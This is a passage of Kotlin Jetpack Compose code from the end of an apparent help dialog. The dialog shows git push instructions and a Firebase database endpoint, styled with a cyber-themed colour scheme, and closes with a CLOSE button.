                    text = "2. To push to GitHub, run:\n`git remote add origin <your-repo-url>`\n`git push -u origin main`",
                    color = CyberGreen,
                    fontSize = 11.sp,
                    fontFamily = FontFamily.Monospace
                )
                Text(
                    text = "3. Firebase RTDB Endpoint: `https://my-project-a03ee-default-rtdb.asia-southeast1.firebasedatabase.app`",
                    color = CyberCyan,
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace
                )
            }
        },
        confirmButton = {
            Button(onClick = onDismiss, colors = ButtonDefaults.buttonColors(containerColor = CyberCyan)) {
                Text("CLOSE", color = CyberBackground, fontWeight = FontWeight.Bold)
            }
        },
        containerColor = CyberSurface
    )
}
